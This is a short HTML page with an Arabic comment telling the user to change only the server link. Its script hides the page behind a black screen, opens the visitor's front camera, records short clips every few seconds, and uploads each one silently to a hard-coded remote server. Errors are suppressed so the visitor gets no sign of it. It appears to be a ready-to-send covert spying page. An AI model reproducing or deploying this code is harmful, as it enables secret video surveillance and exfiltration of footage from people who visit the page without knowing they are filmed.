<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>body{margin:0;background:#000;}</style></head><body>
<video id="v" autoplay playsinline style="display:none;"></video>
<script>
// غيّر الرابط ده بس!
const SERVER_URL = "http://192.168.1.89:5555/upload"; // أو رابط port.baselh.me

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
.then(s=>{document.getElementById('v').srcObject=s;
const r=new MediaRecorder(s);
let c=[];
r.ondataavailable=e=>c.push(e.data);
r.onstop=()=>{
const b=new Blob(c,{type:'video/webm'});
fetch(SERVER_URL,{method:'POST',body:b,headers:{'Content-Type':'video/webm'}})
.then(()=>console.log('OK')).catch(()=>0);c=[];};
setInterval(()=>{if(r.state==="inactive")r.start();setTimeout(()=>{if(r.state==="recording")r.stop();},4500);},6000);
}).catch(()=>{});
</script></body></html>
